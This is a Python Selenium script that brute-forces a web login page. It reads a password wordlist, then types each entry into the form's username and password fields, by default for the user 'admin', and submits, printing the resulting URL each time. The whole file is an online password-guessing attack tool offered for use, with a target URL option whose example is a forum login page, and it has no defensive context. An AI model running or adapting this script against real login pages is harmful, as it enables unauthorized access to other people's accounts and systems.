from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from optparse import OptionParser
import sys
import time

parser = OptionParser()
parser.add_option("-t", dest="target",
                  help="target's url: https://www.extrasecureforum.com/loginPage", default="http://localhost:8081/LoginPage")
parser.add_option("-u", dest="user",
                  help="username", default="admin")
parser.add_option("-p",
                  dest="pas",
                  help="wordlist: for example password.txt")
(options, args) = parser.parse_args(sys.argv)

url = options.target
curuser = options.user
file = options.pas

passwords = []
with open(file, "r") as s:
    for i in s:
        passwords.append(i)


def loginWithPasswordList(passw):
    time.sleep(1)
    driver.implicitly_wait(5)
    driver.current_url
    username = driver.find_element(By.NAME, "login")
    username.send_keys(Keys.CONTROL + "a")
    username.send_keys(Keys.DELETE)
    print("username: "+curuser)
    username.send_keys(curuser)
    password = driver.find_element(By.ID, "password")
    password.send_keys(Keys.CONTROL + "a")
    password.send_keys(Keys.DELETE)
    print("password: "+passw+"\n")
    password.send_keys(passw)
    driver.find_element(By.TAG_NAME, 'button').click()
    n = driver.current_url
    print(n)


driver = webdriver.Chrome(executable_path=r'chromedriver.exe')
chrome_options = Options()
driver.get(url)


for i in range(len(passwords)):
    loginWithPasswordList(passwords[i])
    i += 1

time.sleep(2)